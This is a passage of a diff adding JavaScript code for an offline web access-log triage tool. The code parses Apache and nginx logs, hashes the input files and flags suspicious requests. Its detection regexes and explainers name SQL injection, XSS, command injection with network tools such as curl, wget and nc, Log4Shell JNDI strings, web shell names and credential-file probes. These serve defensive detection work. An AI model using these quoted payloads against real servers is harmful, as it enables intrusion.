+    'Conversations table: columns can be resized and moved by drag (Alt+Left/Right from the keyboard), Reset columns, and paging with a rows-per-page control, matching the Requests table.',
+    'Pattern matches in request details explain themselves on hover or focus: what text matched, what it usually means, why it may be harmless, and a reference (OWASP, MITRE ATT&CK, CISA).',
+    'Leads carry a reference link; the web shell lead explains exactly how it is decided.',
+    'Reference links open in a new tab only when clicked and carry no log data.']],
+  ['1.0.0', '2026-10-13', [
+    'Initial release, built on the FortiGate log triage design (offline, hash-pinned script, hardened rendering).',
+    'Parses Apache/nginx Common and Combined formats, vhost prefixes, syslog-style line prefixes and extra fields; .gz input.',
+    'Extra numeric field can be read as response time (microseconds, milliseconds or seconds), with the assumption shown.',
+    'Request pattern checks: SQL injection, XSS, traversal, sensitive files, remote include/SSRF, command injection, Log4Shell, web shells, admin probes, tool user agents, malformed and proxy requests.',
+    'Web leads: attack patterns answered with 2xx, possible web shells, login guessing, scanning, parameter enumeration, request-rate peaks, server errors, large and slow responses, user agent anomalies.',
+    'Conversations: requests grouped into client sessions with a readable transcript per session.',
+    'Sites panel, timeline by status class, filter language, top values, event table with resizable and movable columns, CSV exports, SHA-256 on ingest, Markdown case summary.']]
+];
+
+/* ================= helpers ================= */
+const MAX_EVENTS = 1500000;
+const MAX_LINE = 65536;
+const PAGE_MAX = 5000;
+const $ = id => document.getElementById(id);
+const nullProto = o => Object.assign(Object.create(null), o);
+const CTRL_RE = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F\u00AD\u061C\u180E\u200B-\u200F\u2028-\u202E\u2060-\u2064\u2066-\u2069\uFEFF]/g;
+const vis = s => String(s == null ? '' : s).replace(CTRL_RE, c => `⟦U+${c.charCodeAt(0).toString(16).toUpperCase().padStart(4, '0')}⟧`);
+const HTML_ESC = nullProto({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' });
+const escA = s => String(s == null ? '' : s).replace(/[&<>"']/g, c => HTML_ESC[c]);   // exact value, attribute-safe
+const esc = s => escA(vis(s));                                                         // for anything a human reads
+const escRe = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+const fmtN = n => Number(n).toLocaleString();
+const pad = (n, w = 2) => String(n).padStart(w, '0');
+const tick = () => new Promise(r => setTimeout(r, 0));
+const clamp = (v, a, b) => Math.max(a, Math.min(b, v));
+function fmtBytes(b) {
+  if (!(b > 0)) return '0 B';
+  const u = ['B', 'KB', 'MB', 'GB', 'TB']; let i = 0;
+  while (b >= 1024 && i < u.length - 1) { b /= 1024; i++; }
+  return (i ? b.toFixed(b < 10 ? 2 : 1) : b) + ' ' + u[i];
+}
+const fmtMs = ms => !(ms >= 0) ? '' : ms < 1000 ? `${ms < 10 ? ms.toFixed(1) : Math.round(ms)} ms` : `${(ms / 1000).toFixed(ms < 10000 ? 2 : 1)} s`;
+function fmtDur(ms) {
+  if (!(ms > 0)) return '0s';
+  const s = Math.round(ms / 1000);
+  if (s < 60) return `${s}s`;
+  if (s < 3600) return `${Math.floor(s / 60)}m ${pad(s % 60)}s`;
+  return `${Math.floor(s / 3600)}h ${pad(Math.floor(s % 3600 / 60))}m`;
+}
+function pushTop(arr, v, item, k) {
+  if (arr.length >= k && v <= arr[arr.length - 1][0]) return;
+  arr.push([v, item]); arr.sort((a, b) => b[0] - a[0]); if (arr.length > k) arr.pop();
+}
+
+const state = {
+  srcIds: new Map(), srcSeq: 0, labels: new Map(), renaming: null, unloaded: [], fileUnloaded: [],
+  events: [], files: [], fileFmts: [], fileHash: [], fileSize: [], fileSkipped: [], fileErrors: [],
+  skipped: 0, skippedSamples: [], longLines: 0, noTime: 0, noTz: 0, truncated: 0, w3c: 0,
+  tz: 'local', tokens: [], range: null, filterError: '', C: [], F: [], buckets: null, drag: null,
+  page: 0, pageSize: 100, newestFirst: true, tbl: { ev: { order: null, w: null }, cv: { order: null, w: null }, tr: { order: null, w: null } },
+  rtMode: 'auto', rtAuto: 'none', rtUnit: 'none', rtField: 'auto', rtFieldAuto: '', rtFieldUsed: '', extras: [],
+  sites: [], sessions: [], sessGap: 30, cvSort: { k: 'n', dir: -1 }, cvPage: 0, cvPageSize: 100, cvRows: [],
+  cur: null, curSession: null
+};
+
+/* ================= time display ================= */
+function parts(ms) {
+  const d = new Date(ms), u = state.tz === 'utc';
+  return u ? [d.getUTCFullYear(), d.getUTCMonth() + 1, d.getUTCDate(), d.getUTCHours(), d.getUTCMinutes(), d.getUTCSeconds()]
+           : [d.getFullYear(), d.getMonth() + 1, d.getDate(), d.getHours(), d.getMinutes(), d.getSeconds()];
+}
+function fmtTime(ms) {
+  if (!isFinite(ms)) return 'no timestamp';
+  const [Y, M, D, h, m, s] = parts(ms);
+  return `${Y}-${pad(M)}-${pad(D)} ${pad(h)}:${pad(m)}:${pad(s)}`;
+}
+function tzLabel() {
+  if (state.tz === 'utc') return 'UTC';
+  const off = -new Date().getTimezoneOffset(), a = Math.abs(off);
+  return `local, UTC${off >= 0 ? '+' : '-'}${pad(Math.floor(a / 60))}:${pad(a % 60)}`;
+}
+
+/* ================= parsing ================= */
+// Splits a line into bare words, "quoted strings" (Apache escapes inner quotes as \") and [bracketed] values. Linear.
+function tokenize(line) {
+  const out = []; let i = 0; const n = line.length;
+  while (i < n) {
+    const c = line.charCodeAt(i);
+    if (c === 32 || c === 9) { i++; continue; }
+    if (c === 34) {
+      let j = i + 1;
+      while (j < n) { const d = line.charCodeAt(j); if (d === 92 && j + 1 < n) { j += 2; continue; } if (d === 34) break; j++; }
+      out.push({ t: 'q', v: line.slice(i + 1, j) }); i = j + 1; continue;
+    }
+    if (c === 91) {
+      const j = line.indexOf(']', i + 1);
+      if (j < 0) { out.push({ t: 'w', v: line.slice(i) }); break; }
+      out.push({ t: 'b', v: line.slice(i + 1, j) }); i = j + 1; continue;
+    }
+    let j = i; while (j < n) { const d = line.charCodeAt(j); if (d === 32 || d === 9) break; j++; }
+    out.push({ t: 'w', v: line.slice(i, j) }); i = j;
+  }
+  return out;
+}
+const MONTHS = nullProto({ jan: 0, feb: 1, mar: 2, apr: 3, may: 4, jun: 5, jul: 6, aug: 7, sep: 8, oct: 9, nov: 10, dec: 11 });
+const TS_RE = /^(\d{1,2})\/([A-Za-z]{3})\/(\d{4}):(\d{2}):(\d{2}):(\d{2})(?:[.,](\d{1,9}))?(?:\s+([+-])(\d{2}):?(\d{2}))?$/;
+function parseTs(v) {
+  const m = TS_RE.exec(v); if (!m) return NaN;
+  const mo = MONTHS[m[2].toLowerCase()]; if (mo === undefined) return NaN;
+  let t = Date.UTC(+m[3], mo, +m[1], +m[4], +m[5], +m[6], m[7] ? Math.floor(Number('0.' + m[7]) * 1000) : 0);
+  if (m[8]) { const off = (+m[9] * 60 + +m[10]) * 6e4; t += m[8] === '+' ? -off : off; } else state.noTz++;
+  return t;
+}
+const unescQ = s => s.replace(/\\(["\\])/g, '$1');
+function parseWeb(line) {
+  const T = tokenize(line);
+  let bi = -1;
+  for (let i = 0; i < T.length && i < 16; i++) if (T[i].t === 'b' && TS_RE.test(T[i].v)) { bi = i; break; }
+  if (bi < 3) return null;
+  const L = bi;
+  for (let i = 0; i < L; i++) if (T[i].t !== 'w') return null;
+  const o = Object.create(null);
+  o.client = T[L - 3].v; o.ident = T[L - 2].v; o.user = T[L - 1].v;
+  if (L === 4) {                                   // vhost_combined: "%v:%p %h %l %u %t ..."
+    const vh = T[0].v, c = vh.lastIndexOf(':');
+    if (c > 0 && /^\d+$/.test(vh.slice(c + 1))) { o.vhost = vh.slice(0, c); o.port = vh.slice(c + 1); } else o.vhost = vh;
+  } else if (L > 4) o.prefix = T.slice(0, L - 3).map(x => x.v).join(' ');   // e.g. syslog header
+  o.time = T[bi].v; o.$t = parseTs(T[bi].v);
+  const rq = T[bi + 1], st = T[bi + 2];
+  if (!rq || rq.t !== 'q' || !st || st.t !== 'w' || !/^\d{3}$/.test(st.v)) return null;
+  o.request = unescQ(rq.v); o.status = st.v;
+  let k = bi + 3;
+  if (T[k] && T[k].t === 'w' && /^(\d+|-)$/.test(T[k].v)) { o.bytes = T[k].v === '-' ? '0' : T[k].v; k++; }
+  const rest = T.slice(k);
+  let qi = -1;
+  for (let i = 0; i + 1 < rest.length; i++) if (rest[i].t === 'q' && rest[i + 1].t === 'q') { qi = i; break; }
+  let mid = [], tail = rest;
+  if (qi >= 0) { o.referer = unescQ(rest[qi].v); o.ua = unescQ(rest[qi + 1].v); mid = rest.slice(0, qi); tail = rest.slice(qi + 2); }
+  const extras = mid.concat(tail);
+  for (let i = 0; i < extras.length && i < 8; i++) o['x' + (i + 1)] = unescQ(extras[i].v);
+  o.$fmt = (o.vhost !== undefined ? 'vhost + ' : '') + (qi >= 0 ? 'Combined' : 'Common (CLF)') +
+    (mid.length ? `, ${mid.length} extra field${mid.length > 1 ? 's' : ''} after bytes` : '') +
+    (tail.length ? `, ${tail.length} extra field${tail.length > 1 ? 's' : ''} at end` : '') + (o.prefix ? ', with line prefix' : '');
+  return o;
+}
+
+/* ---------- request patterns ---------- */
+const RULES = [
+  ['sqli', 'SQL injection pattern', /(\bunion\b[\s\S]{0,40}?\bselect\b|\bselect\b[\s\S]{0,60}?\bfrom\b|['"]\s*(and|or)\s+['"]?\w{1,20}['"]?\s*(=|<|>|like)|\b(and|or)\s+\d{1,6}\s*=\s*\d{1,6}\b|\bsleep\s*\(\s*\d|\bbenchmark\s*\(|\bwaitfor\s+delay\b|\binformation_schema\b|\bxp_cmdshell\b|;\s*(drop|insert|update|delete|shutdown|exec)\s|\bextractvalue\s*\(|\bupdatexml\s*\(|\bload_file\s*\(|\binto\s+(out|dump)file\b|\bpg_sleep\s*\()/i],
+  ['xss', 'Cross-site scripting pattern', /(<\s*\/?\s*script\b|javascript\s*:|\bon(error|load|mouseover|focus|click|toggle|begin)\s*=|<\s*(svg|img|iframe|body|details|video|audio)\b|\balert\s*\(|\bprompt\s*\(|\bconfirm\s*\(|document\s*\.\s*(cookie|domain)|\beval\s*\()/i],
+  ['traversal', 'Path traversal', /(\.\.[\/\\]|[\/\\]\.\.(?=[\/\\?]|$))/],
+  ['lfi', 'System file reference', /(\/etc\/(passwd|shadow|hosts|group|issue)\b|\/proc\/self\/|\bwin\.ini\b|\bboot\.ini\b|[\/\\]windows[\/\\]system32\b|\bc:[\/\\])/i],
+  ['rfi_ssrf', 'Remote include or SSRF pattern', /([?&][^=&]{1,40}=\s*(https?|ftp|gopher|dict|file|php|data|expect|jar|ldap)s?:\/\/|169\.254\.169\.254|metadata\.google\.internal|\bphp:\/\/(filter|input)|\bdata:text\/html)/i],
+  ['cmdi', 'Command injection pattern', /(;|\||`|\$\(|&&|\n)\s*(cat|id|whoami|uname|wget|curl|nc|ncat|bash|sh|zsh|powershell|pwsh|cmd(\.exe)?|ping|nslookup|ls|dir|echo|net\s+user)\b/i],
+  ['log4shell', 'Log4Shell / JNDI lookup', /\$\{\s*(jndi\s*:|lower\s*:|upper\s*:|env\s*:|sys\s*:|::-|base64\s*:)/i],
+  ['webshell', 'Web shell name or parameter', /(\/(c99|r57|wso|b374k|alfa\w*|shell\w*|cmd\w*|webshell|backdoor|up(load)?er)\.(php\d?|phtml|jspx?|aspx?|ashx|cfm)\b|[?&](cmd|exec|command|execute)=)/i],
+  ['sensitive', 'Sensitive file or backup probe', /(\/\.(env|git|svn|hg|htaccess|htpasswd|ds_store|aws|ssh|bash_history|npmrc|dockerenv)\b|\bwp-config\.php|\bweb\.config\b|\/config\.(php|inc|json|ya?ml|ini)\b|\.(bak|old|orig|save|swp|sql|sqlite|db|tar|tgz|7z|rar|pem|key|kdbx)(\?|$)|\bphpinfo\b|\/server-(status|info)\b|\bid_rsa\b)/i],
+  ['admin', 'Admin or management interface probe', /(\/wp-admin\b|\/wp-login\.php|\/xmlrpc\.php|\/phpmyadmin|\/pma\/|\/adminer|\/manager\/html|\/host-manager|\/actuator\b|\/jmx-console|\/web-console|\/solr\/|\/cgi-bin\/|\/boaform|\/hnap1|\/owa\/auth|\/remote\/fgt_lang|\/global-protect|\/administrator\b)/i]
+];
+const RULE_NAME = nullProto({
+  malformed: 'Malformed or non-HTTP request', method: 'Unusual HTTP method', proxy: 'Proxy or CONNECT request',
+  tool: 'Attack tool user agent'
+});
+for (const [id, name] of RULES) RULE_NAME[id] = name;
+const isHit = o => !!o.$rules && o.$rules.some(r => r !== 'tool');   // tool UA marks the client, not the individual request
+// Explainers for each pattern: what it looks for, why it can be harmless, and where to read more.
+// Every reference is a fixed URL in this file; nothing from the logs is ever put into a link.
+const REF = nullProto({
+  sqli: ['OWASP: SQL Injection', 'https://owasp.org/www-community/attacks/SQL_Injection'],
+  blindsqli: ['OWASP: Blind SQL Injection', 'https://owasp.org/www-community/attacks/Blind_SQL_Injection'],
+  xss: ['OWASP: Cross Site Scripting (XSS)', 'https://owasp.org/www-community/attacks/xss/'],
+  traversal: ['OWASP: Path Traversal', 'https://owasp.org/www-community/attacks/Path_Traversal'],
+  ssrf: ['OWASP: Server Side Request Forgery', 'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'],
+  cmdi: ['OWASP: Command Injection', 'https://owasp.org/www-community/attacks/Command_Injection'],
+  log4shell: ['CISA: Apache Log4j vulnerability guidance', 'https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance'],
+  webshell: ['MITRE ATT&CK T1505.003: Web Shell', 'https://attack.mitre.org/techniques/T1505/003/'],
+  forced: ['OWASP: Forced browsing', 'https://owasp.org/www-community/attacks/Forced_browsing'],
+  scanning: ['MITRE ATT&CK T1595.002: Vulnerability Scanning', 'https://attack.mitre.org/techniques/T1595/002/'],
+  stuffing: ['OWASP: Credential stuffing', 'https://owasp.org/www-community/attacks/Credential_stuffing'],
+  idor: ['OWASP Cheat Sheet: Insecure Direct Object Reference Prevention', 'https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html'],
+  methods: ['OWASP WSTG: Test HTTP Methods', 'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods']
+});
+const RULE_INFO = nullProto({
+  sqli: { what: 'SQL syntax in the URL, such as UNION SELECT, OR 1=1, quotes followed by AND/OR, or SLEEP().', harmless: 'Search boxes and some APIs legitimately carry SQL-like words. It matters when the same path then returns errors, unusual sizes, or responses delayed by the amount the payload asked for.', refs: ['sqli', 'blindsqli'] },
+  xss: { what: 'Script or HTML injection markers: \u003cscript>, javascript:, onerror=, alert().', harmless: 'The server answering 200 does not mean the script ran. Reflected XSS only works if the page echoes the input unencoded, which the access log cannot show.', refs: ['xss'] },
+  traversal: { what: '../ (or an encoded form) used to climb out of a directory.', harmless: 'Web servers usually collapse ../ in the path itself before serving, so a 200 often just means the normalised path exists. It matters most inside a parameter (file=../../) or when the response differs from that page\'s normal response.', refs: ['traversal'] },
+  lfi: { what: 'Names of operating-system files such as /etc/passwd, /proc/self, win.ini.', harmless: 'Usually scanners. It matters when the response size looks like the file was actually returned.', refs: ['traversal'] },
+  rfi_ssrf: { what: 'A parameter whose value is a URL or scheme (http://, file://, php://), or a cloud metadata address.', harmless: 'Redirect and callback parameters legitimately carry URLs. It matters when the value points at internal or metadata addresses, or at a host you do not recognise.', refs: ['ssrf'] },
+  cmdi: { what: 'Shell syntax followed by a command name: ; id, | whoami, $(curl …), && cat.', harmless: 'Rarely legitimate in a URL. Check whether the response size changes with each command; identical sizes suggest the input was ignored.', refs: ['cmdi'] },
+  log4shell: { what: 'A JNDI lookup string such as ${jndi:ldap://…}.', harmless: 'Mostly internet-wide scanning since 2021. It matters only if a Java application on this host logs the input with a vulnerable Log4j version; the access log cannot show that.', refs: ['log4shell'] },
+  webshell: { what: 'A file name typical of known web shells (c99, r57, wso, shell.php …) or a command-style parameter: cmd=, exec=, command=, execute=.', harmless: 'A cmd= parameter on its own is weak evidence: some applications use it legitimately, and scanners spray it at every page. It becomes strong when the same client keeps getting 2xx, the script is not part of the normal site, the response size changes with each command, or the file appeared recently. Confirm on the server: does the file exist, when was it created or modified, and did the web server process start shells around that time?', refs: ['webshell', 'cmdi'] },
+  sensitive: { what: 'Requests for files that should never be public: .env, .git/, backups (.bak, .sql), keys, phpinfo, server-status.', harmless: 'Almost always scanners collecting 404s. It matters when one of these gets a 2xx with a plausible size.', refs: ['forced'] },
+  admin: { what: 'Well-known admin and management paths: wp-admin, phpMyAdmin, Tomcat manager, actuator, cgi-bin.', harmless: 'Normal for a site that really runs that software. Otherwise it is fingerprinting by scanners.', refs: ['forced'] },
+  tool: { what: 'A user agent that names an attack or scanning tool (sqlmap, Nuclei, Nikto …).', harmless: 'Authorised penetration tests and your own vulnerability scanning look exactly like this. Check whether a test was scheduled before escalating.', refs: ['scanning'] },
+  malformed: { what: 'The request line is not valid HTTP. Often TLS sent to a plain-HTTP port, or protocol and port scanners.', harmless: 'Nearly always background noise, but a burst from one client is a scanner fingerprinting the service.', refs: [] },
+  method: { what: 'An HTTP method outside GET, HEAD, POST, PUT, DELETE, OPTIONS, PATCH (for example TRACE, PROPFIND).', harmless: 'WebDAV clients and some APIs use extra methods legitimately. TRACE and TRACK are almost always probes.', refs: ['methods'] },
+  proxy: { what: 'CONNECT, or an absolute URL in the request line: someone testing whether this server acts as an open proxy.', harmless: 'Harmless if refused (4xx). A 2xx needs checking, because an open proxy can be abused to reach other systems.', refs: ['methods'] }
+});
+function refLink(id) { const r = REF[id]; return r ? `<a href="${escA(r[1])}" target="_blank" rel="noopener noreferrer">${esc(r[0])} ↗</a>` : ''; }
+function matchedText(o, id) {
+  if (id === 'tool') { const m = TOOL_UA.exec(o.ua || ''); return m ? m[0] : ''; }
+  const rule = RULES.find(r => r[0] === id); if (!rule) return '';
+  const target = o.method === '(malformed)' ? o.request : urlOf(o);
+  const m = rule[2].exec(pctDecode(pctDecode(hexDecode(target))).replace(/\+/g, ' '));
+  return m ? m[0].trim() : '';
+}
+// Badges carry only the rule id; the explainer is built on demand for the request the badge belongs to
+// and shown in one floating panel, so it is never clipped by a table cell or the drawer edge.
+const ruleChip = id => `<span class="rule" tabindex="0" data-rule="${escA(id)}">${esc(RULE_NAME[id])}</span>`;
+function ruleTipHtml(o, id) {
+  const info = RULE_INFO[id] || {}, m = matchedText(o, id);
+  return (m ? `<span class="rt-l">Matched</span><code>${esc(m.length > 80 ? m.slice(0, 80) + '…' : m)}</code>` : '') +
+    (info.what ? `<span class="rt-l">Looks for</span>${esc(info.what)}` : '') +
+    (info.harmless ? `<span class="rt-l">Why it may be harmless</span>${esc(info.harmless)}` : '') +
+    `<span class="rt-l">A pattern match shows intent, not success.</span>` +
+    ((info.refs || []).length ? `<span class="rt-refs">${info.refs.map(refLink).join('')}</span>` : '');
+}
+function eventForChip(chip) {
+  const tr = chip.closest('tr');
+  if (tr && chip.closest('#evBody')) return state.F[Number(tr.dataset.i)];
+  if (tr && chip.closest('table.tr')) return state.curSession ? state.curSession.ev[Number(tr.dataset.i)] : null;
+  return state.cur;
+}
+let tipTimer = 0, tipFor = null;
+function showRuleTip(chip) {
+  clearTimeout(tipTimer);
+  const o = eventForChip(chip); if (!o) return;
+  const t = $('floatTip');
+  if (tipFor !== chip) {
+    if (tipFor) tipFor.removeAttribute('aria-describedby');
+    t.innerHTML = ruleTipHtml(o, chip.dataset.rule); tipFor = chip; chip.setAttribute('aria-describedby', 'floatTip');
+  }
+  t.hidden = false;
+  const r = chip.getBoundingClientRect(), tw = t.offsetWidth, th = t.offsetHeight;
+  let top = r.bottom + 4; if (top + th > innerHeight - 8) top = Math.max(8, r.top - th - 4);
+  t.style.left = clamp(r.left, 8, Math.max(8, innerWidth - tw - 8)) + 'px'; t.style.top = top + 'px';
+}
+function hideRuleTip(now) {
+  clearTimeout(tipTimer);
+  const go = () => { $('floatTip').hidden = true; if (tipFor) { tipFor.removeAttribute('aria-describedby'); tipFor = null; } };
+  if (now) go(); else tipTimer = setTimeout(go, 220);
+}
+function setupRuleTips() {
+  const chipOf = n => n && n.closest ? n.closest('.rule[data-rule]') : null;
+  const inTip = n => !!(n && n.closest && n.closest('#floatTip'));
+  document.addEventListener('pointerover', e => { const c = chipOf(e.target); if (c) showRuleTip(c); else if (inTip(e.target)) clearTimeout(tipTimer); });
+  document.addEventListener('pointerout', e => {
+    if (!chipOf(e.target) && !inTip(e.target)) return;
+    const to = e.relatedTarget; if (inTip(to) || (to && chipOf(to) === tipFor)) return;
+    hideRuleTip();
+  });
+  document.addEventListener('focusin', e => { const c = chipOf(e.target); if (c) showRuleTip(c); else if (inTip(e.target)) clearTimeout(tipTimer); });
+  document.addEventListener('focusout', e => { if ((chipOf(e.target) || inTip(e.target)) && !inTip(e.relatedTarget)) hideRuleTip(); });
+  window.addEventListener('scroll', e => { if (!inTip(e.target)) hideRuleTip(true); }, true);
+  window.addEventListener('resize', () => hideRuleTip(true));
+}
+const STRONG = new Set(['sqli', 'xss', 'traversal', 'lfi', 'rfi_ssrf', 'cmdi', 'log4shell', 'webshell', 'sensitive']);
+const TOOL_UA = /(sqlmap|nikto|nuclei|nmap|masscan|zgrab|dirbuster|gobuster|feroxbuster|\bffuf\b|wfuzz|acunetix|nessus|openvas|netsparker|burp ?suite|w3af|whatweb|wpscan|hydra|interactsh|commix|jaeles|arachni|skipfish|joomscan|owasp zap)/i;
+const REQ_RE = /^([A-Za-z][A-Za-z0-9_-]{0,19}) (\S+)(?: (HTTP\/\d(?:\.\d)?))?$/;
+const STD_METHODS = new Set(['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']);
+const pctDecode = s => s.replace(/%([0-9a-fA-F]{2})/g, (m, h) => String.fromCharCode(parseInt(h, 16)));
+const hexDecode = s => s.replace(/\\x([0-9a-fA-F]{2})/g, (m, h) => String.fromCharCode(parseInt(h, 16)));
+
+function enrich(o) {
+  const r = o.request; let m;
+  if (r === '-' || r === '') { o.method = '(none)'; o.path = ''; }
+  else if ((m = REQ_RE.exec(r))) {
+    o.method = m[1].toUpperCase(); o.proto = m[3] || 'HTTP/0.9';
+    const tgt = m[2], qi = tgt.indexOf('?');
+    o.path = qi < 0 ? tgt : tgt.slice(0, qi);
+    if (qi >= 0) o.query = tgt.slice(qi + 1);
+  } else { o.method = '(malformed)'; o.path = ''; }
+  o.$sc = /^[1-5]\d\d$/.test(o.status) ? o.status[0] + 'xx' : 'other';
+  const seg = o.path.slice(o.path.lastIndexOf('/') + 1), dot = seg.lastIndexOf('.');
+  if (dot > 0 && seg.length - dot <= 8) o.$ext = seg.slice(dot + 1).toLowerCase();
+  if (o.referer && o.referer !== '-') { const mm = /^[a-z][a-z0-9+.-]*:\/\/([^\/?#:]+)/i.exec(o.referer); if (mm) o.$refhost = mm[1].toLowerCase(); }
+  if (o.query) {
+    const ks = [];
+    for (const part of o.query.split('&')) { if (ks.length >= 20) break; const e = part.indexOf('='); const k = e < 0 ? part : part.slice(0, e); if (k && !ks.includes(k.toLowerCase())) ks.push(k.toLowerCase()); }
+    if (ks.length) o.$qkeys = ks;
+  }
+  const hits = [];
+  if (o.method === '(malformed)') hits.push('malformed');
+  else if (o.method === 'CONNECT') hits.push('proxy');
+  else if (o.method !== '(none)' && !STD_METHODS.has(o.method)) hits.push('method');
+  const target = o.method === '(malformed)' ? r : o.path + (o.query !== undefined ? '?' + o.query : '');
+  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(o.path) && !hits.includes('proxy')) hits.push('proxy');
+  if (target) {
+    const d = pctDecode(pctDecode(hexDecode(target))).replace(/\+/g, ' ');
+    for (const [id, , re] of RULES) if (re.test(d)) hits.push(id);
+  }
+  if (o.ua && TOOL_UA.test(o.ua)) hits.push('tool');
+  if (hits.length) o.$rules = hits;
+}
+
+/* ---------- streaming SHA-256 (no secure-context requirement, constant memory) ---------- */
+const SHA_K = new Int32Array([0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+  0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,
+  0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,
+  0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,
+  0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,
+  0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2]);
+class Sha256 {
+  constructor() {
+    this.h = new Int32Array([0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19]);
+    this.w = new Int32Array(64); this.buf = new Uint8Array(64); this.len = 0; this.total = 0;
+  }
+  block(d, o) {
+    const w = this.w, K = SHA_K, H = this.h;
+    for (let t = 0; t < 16; t++, o += 4) w[t] = (d[o] << 24) | (d[o + 1] << 16) | (d[o + 2] << 8) | d[o + 3];
+    for (let t = 16; t < 64; t++) {
+      const x = w[t - 15], y = w[t - 2];
+      const s0 = ((x >>> 7) | (x << 25)) ^ ((x >>> 18) | (x << 14)) ^ (x >>> 3);
+      const s1 = ((y >>> 17) | (y << 15)) ^ ((y >>> 19) | (y << 13)) ^ (y >>> 10);
+      w[t] = (w[t - 16] + s0 + w[t - 7] + s1) | 0;
+    }
+    let a = H[0], b = H[1], c = H[2], d0 = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
+    for (let t = 0; t < 64; t++) {
+      const S1 = ((e >>> 6) | (e << 26)) ^ ((e >>> 11) | (e << 21)) ^ ((e >>> 25) | (e << 7));
+      const t1 = (h + S1 + ((e & f) ^ (~e & g)) + K[t] + w[t]) | 0;
+      const S0 = ((a >>> 2) | (a << 30)) ^ ((a >>> 13) | (a << 19)) ^ ((a >>> 22) | (a << 10));
+      const t2 = (S0 + ((a & b) ^ (a & c) ^ (b & c))) | 0;
+      h = g; g = f; f = e; e = (d0 + t1) | 0; d0 = c; c = b; b = a; a = (t1 + t2) | 0;
+    }
+    H[0] = (H[0] + a) | 0; H[1] = (H[1] + b) | 0; H[2] = (H[2] + c) | 0; H[3] = (H[3] + d0) | 0;
+    H[4] = (H[4] + e) | 0; H[5] = (H[5] + f) | 0; H[6] = (H[6] + g) | 0; H[7] = (H[7] + h) | 0;
+  }
+  update(data) {
+    let i = 0; const n = data.length; this.total += n;
+    if (this.len) {
+      const take = Math.min(64 - this.len, n);
+      this.buf.set(data.subarray(0, take), this.len); this.len += take; i = take;
+      if (this.len < 64) return;
+      this.block(this.buf, 0); this.len = 0;
+    }
+    for (; i + 64 <= n; i += 64) this.block(data, i);
+    if (i < n) { this.buf.set(data.subarray(i), 0); this.len = n - i; }
+  }
+  hex() {
+    const bits = this.total * 8, padLen = (this.len < 56 ? 56 - this.len : 120 - this.len) + 8;
+    const p = new Uint8Array(padLen); p[0] = 0x80;
+    const hi = Math.floor(bits / 4294967296), lo = bits >>> 0;
+    p[padLen - 8] = hi >>> 24; p[padLen - 7] = hi >>> 16; p[padLen - 6] = hi >>> 8; p[padLen - 5] = hi;
+    p[padLen - 4] = lo >>> 24; p[padLen - 3] = lo >>> 16; p[padLen - 2] = lo >>> 8; p[padLen - 1] = lo;
+    this.update(p);
+    return [...this.h].map(x => (x >>> 0).toString(16).padStart(8, '0')).join('');
+  }
+}
+
+/* ================= ingest ================= */
+function skipLine(line, fileIdx, why) {
+  state.skipped++; state.fileSkipped[fileIdx]++;
+  if (why === 'long') state.longLines++;
+  if (state.skippedSamples.length < 3) state.skippedSamples.push(line.length > 300 ? line.slice(0, 300) + '…' : line);
+}
+function ingestLine(line, fileIdx) {
+  if (!line) return;
+  if (line.length > MAX_LINE) { skipLine(line, fileIdx, 'long'); return; }
+  if (line.charCodeAt(line.length - 1) === 13) line = line.slice(0, -1);
+  if (!line.trim()) return;
+  if (line[0] === '#') { if (/^#(Fields|Software|Version):/.test(line)) state.w3c++; return; }
+  const ntz0 = state.noTz;
+  const o = parseWeb(line);
+  if (!o) { state.noTz = ntz0; skipLine(line, fileIdx); return; }
+  if (state.noTz !== ntz0) o.$ntz = 1;      // remembered per request so counts stay right after an unload
+  if (state.events.length >= MAX_EVENTS) { state.truncated++; return; }
+  if (isNaN(o.$t)) state.noTime++;
+  enrich(o);
+  o.$raw = line; o.$f = fileIdx; o.$file = state.files[fileIdx];
+  const fc = state.fileFmts[fileIdx]; fc[o.$fmt] = (fc[o.$fmt] || 0) + 1;
+  state.events.push(o);
+}
+async function readFile(file, idx) {
+  const [forHash, forParse] = file.stream().tee();
+  const hasher = new Sha256();
+  const hashing = (async () => {
+    const r = forHash.getReader();
+    for (;;) { const { done, value } = await r.read(); if (done) break; hasher.update(value); }
+    state.fileHash[idx] = hasher.hex();
+  })().catch(err => { state.fileErrors.push(`${file.name}: hashing failed (${err.message || err})`); });
+  try { await parseStream(forParse, file, idx); }
+  finally { await hashing; }
+}
+async function parseStream(stream, file, idx) {
+  const gz = /\.gz$/i.test(file.name);
+  if (gz) {
+    if (typeof DecompressionStream === 'undefined') throw new Error('this browser cannot decompress .gz; extract it first');
+    stream = stream.pipeThrough(new DecompressionStream('gzip'));
+  }
